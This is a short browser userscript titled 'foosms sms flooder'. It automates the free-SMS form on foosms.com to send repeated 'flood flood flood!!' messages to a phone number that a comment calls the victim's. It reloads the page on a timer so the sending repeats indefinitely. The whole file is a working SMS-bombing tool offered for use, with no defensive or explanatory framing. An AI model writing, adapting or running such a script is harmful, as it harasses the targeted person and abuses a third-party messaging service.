// ==UserScript==
// @name          foosms sms flooder
// @namespace     Yash
// @description   flooder sms
// @include       http://*foosms.com/*
// ==/UserScript==

var victim=0; //Enter victims number here
var delay=121000; // Enter delay in milliseconds if required


if(document.location=="http://www.foosms.com/inner.php")
{
document.getElementById('mobile').value=victim;
document.forms[0].elements[1].value=Math.floor(Math.random()*1456484)+'flood flood flood!!'+Math.floor(Math.random()*1456484);
void(0);
document.forms[0].submit();
}

if(document.location=="http://www.foosms.com/sendsms.php")
{
setTimeout('document.location="http://foosms.com/free-sms.php"',delay);
}